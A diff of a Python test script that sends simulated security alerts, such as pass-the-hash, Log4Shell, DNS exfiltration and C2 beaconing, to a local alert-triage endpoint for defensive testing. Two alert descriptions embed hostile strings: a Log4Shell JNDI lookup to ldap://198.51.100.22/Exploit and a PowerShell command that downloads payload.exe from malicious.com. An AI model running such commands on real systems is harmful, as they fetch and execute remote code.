@@ -13,194 +13,139 @@ url = "http://localhost:8000/qualifier-alerte"
 # ============================================================
 USE_ML_ENGINE = True  # <-- Change this to False to bypass ML
 
-# 8 different attack scenarios — including Dual-Engine ML filtering and Threat Intel Bypass tests
+# 8 Advanced, Real-World Cybersecurity Scenarios (All occurring during business hours)
 scenarios = [
     {
-        "name": "TEST 1: SQL Injection (External IP)",
+        "name": "TEST 1: Lateral Movement (Pass-the-Hash)",
         "payload": {
             "alert": {
                 "id": 1001,
-                "description": "Web application attack: SQL injection attempt detected in HTTP request",
-                "level": 10,
-                "src_ip": "45.33.32.156",
-                "timestamp": "2026-07-22T22:00:00Z"
+                "description": "Windows Logon Success. Logon Type 3 (Network). Authentication Package: NTLM. Suspicious rapid movement from Workstation to Domain Controller.",
+                "level": 9,
+                "src_ip": "192.168.1.105",
+                "timestamp": "2026-07-22T14:15:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {
-                    "found": True,
-                    "error": None,
-                    "matches": [
-                        {"name": "Known SQL Injection scanner", "pattern_type": "stix", "pattern": "[ipv4-addr:value = '45.33.32.156']"}
-                    ]
-                }
+                "opencti": {"found": False, "matches": []}
             },
+            "blue_team_context": "We suspect a compromised admin workstation at 192.168.1.105. Any lateral movement towards the DC should be isolated immediately.",
             "correlation": {
-                "total_sources_matched": 1,
-                "preliminary_verdict": "known_malicious",
+                "preliminary_verdict": "suspicious",
                 "confidence": "high"
             }
         }
     },
     {
-        "name": "TEST 2: External DDoS Attack",
+        "name": "TEST 2: Zero-Day Web Exploit (Log4Shell)",
         "payload": {
             "alert": {
                 "id": 1002,
-                "description": "High volume of ICMP packets detected - possible DDoS flood attack",
+                "description": "Web application attack: Suspicious JNDI lookup in HTTP User-Agent header (${jndi:ldap://198.51.100.22/Exploit}).",
                 "level": 12,
-                "src_ip": "203.0.113.99",
-                "timestamp": "2026-07-22T22:01:00Z"
+                "src_ip": "198.51.100.22",
+                "timestamp": "2026-07-22T10:30:00Z"
             },
             "threat_intel": {
-                "misp": {
-                    "found": True,
-                    "matches": [{"name": "DDoS botnet C2 node"}]
-                },
-                "opencti": {
-                    "found": True,
-                    "error": None,
-                    "matches": [
-                        {"name": "Known DDoS botnet member", "pattern_type": "stix", "pattern": "[ipv4-addr:value = '203.0.113.99']"}
-                    ]
-                }
-            },
-            "correlation": {
-                "total_sources_matched": 2,
-                "preliminary_verdict": "known_malicious",
-                "confidence": "high"
+                "misp": {"found": True, "matches": [{"name": "Log4Shell Exploitation Node"}]},
+                "opencti": {"found": True, "matches": [{"name": "Known Malicious IP"}]}
             }
         }
     },
     {
-        "name": "TEST 3: Internal Ransomware Infection",
+        "name": "TEST 3: Insider Threat (DNS Data Exfiltration)",
         "payload": {
             "alert": {
                 "id": 1003,
-                "description": "Mass file encryption detected - files renamed with unknown extension, possible ransomware activity",
-                "level": 15,
-                "src_ip": "10.0.0.45",
-                "timestamp": "2026-07-22T22:02:00Z"
+                "description": "Anomalous DNS traffic volume: Over 5000 TXT record queries to an external unknown domain within 5 minutes.",
+                "level": 8,
+                "src_ip": "192.168.1.50",
+                "timestamp": "2026-07-22T15:45:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {"found": False, "error": None, "matches": []}
-            },
-            "correlation": {
-                "total_sources_matched": 0,
-                "preliminary_verdict": "suspicious",
-                "confidence": "medium"
+                "opencti": {"found": False, "matches": []}
             }
         }
     },
     {
-        "name": "TEST 4: Normal Employee Login (Should be Faux Positif)",
+        "name": "TEST 4: Legitimate Admin Activity (False Positive)",
         "payload": {
             "alert": {
                 "id": 1004,
-                "description": "Dovecot Authentication Success.",
-                "level": 2,
-                "src_ip": "192.168.1.55",
-                "timestamp": "2026-07-22T08:30:00Z"
+                "description": "SSH Login Success. User executed 'htop' and 'df -h' commands.",
+                "level": 3,
+                "src_ip": "192.168.1.10",
+                "timestamp": "2026-07-22T11:00:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {"found": False, "error": None, "matches": []}
+                "opencti": {"found": False, "matches": []}
             },
-            "correlation": {
-                "total_sources_matched": 0,
-                "preliminary_verdict": "benign",
-                "confidence": "high"
-            }
+            "blue_team_context": "192.168.1.10 is the authorized Jump Host for SysAdmins."
         }
     },
     {
-        "name": "TEST 5: Port Scan from Unknown IP",
+        "name": "TEST 5: Living off the Land (PowerShell Payload Download)",
         "payload": {
             "alert": {
                 "id": 1005,
-                "description": "Port scan detected - multiple TCP SYN requests across 1000 ports in under 10 seconds",
-                "level": 7,
-                "src_ip": "198.51.100.77",
-                "timestamp": "2026-07-22T22:05:00Z"
+                "description": "Suspicious PowerShell Execution: powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Temp\update.exe",
+                "level": 12,
+                "src_ip": "192.168.1.77",
+                "timestamp": "2026-07-22T13:20:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {"found": False, "error": None, "matches": []}
-            },
-            "correlation": {
-                "total_sources_matched": 0,
-                "preliminary_verdict": "unknown",
-                "confidence": "low"
+                "opencti": {"found": False, "matches": []}
             }
         }
     },
     {
-        "name": "TEST 6: Repeated Attack (Checking Memory Database)",
+        "name": "TEST 6: Supply Chain Compromise (C2 Beaconing)",
         "payload": {
             "alert": {
                 "id": 1006,
-                "description": "Web application attack: SQL injection attempt detected in HTTP request AGAIN",
-                "level": 10,
-                "src_ip": "45.33.32.156",
-                "timestamp": "2026-07-24T22:30:00Z"
+                "description": "Internal CI/CD Jenkins server initiated outbound connection to unknown external IP on port 4444 (Meterpreter default).",
+                "level": 14,
+                "src_ip": "10.0.0.5",
+                "timestamp": "2026-07-22T09:15:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {"found": True, "error": None, "matches": [{"name": "Known SQL Injection scanner"}]}
-            },
-            "correlation": {
-                "total_sources_matched": 1,
-                "preliminary_verdict": "known_malicious",
-                "confidence": "high"
+                "opencti": {"found": True, "matches": [{"name": "Cobalt Strike Team Server"}]}
             }
         }
     },
     {
-        "name": "TEST 7: Instant ML Filter (Benign log)",
+        "name": "TEST 7: Privilege Escalation (Linux Shadow File)",
         "payload": {
             "alert": {
                 "id": 1007,
-                "description": "Dovecot Authentication Success.",
-                "level": 3,
-                "src_ip": "192.168.1.10",
-                "timestamp": "2026-07-25T09:00:00Z"
+                "description": "Auditd: User 'www-data' executed 'sudo su' and modified /etc/shadow file.",
+                "level": 11,
+                "src_ip": "172.16.0.20",
+                "timestamp": "2026-07-22T16:00:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {"found": False, "error": None, "matches": []}
-            },
-            "correlation": {
-                "total_sources_matched": 0,
-                "preliminary_verdict": "benign",
-                "confidence": "high"
+                "opencti": {"found": False, "matches": []}
             }
         }
     },
     {
-        "name": "TEST 8: Threat Intel Bypass (Low level, but malicious IP)",
+        "name": "TEST 8: SaaS Hijacking (Impossible Travel)",
         "payload": {
             "alert": {
                 "id": 1008,
-                "description": "Connection closed by authentication failure",
-                "level": 3,
-                "src_ip": "85.20.10.5",
-                "timestamp": "2026-07-25T23:00:00Z"
+                "description": "Azure AD: Multiple failed MFA attempts followed by successful login from an IP address in North Korea.",
+                "level": 13,
+                "src_ip": "175.45.176.10",
+                "timestamp": "2026-07-22T14:30:00Z"
             },
             "threat_intel": {
                 "misp": {"found": False, "matches": []},
-                "opencti": {
-                    "found": True,
-                    "error": None,
-                    "matches": [
-                        {"name": "Known Brute Forcer", "pattern_type": "stix", "pattern": "[ipv4-addr:value = '85.20.10.5']"}
-                    ]
-                }
-            },
-            "correlation": {
-                "total_sources_matched": 1,
-                "preliminary_verdict": "known_malicious",
-                "confidence": "high"
+                "opencti": {"found": True, "matches": [{"name": "DPRK State Sponsored IP"}]}
             }
         }
     }
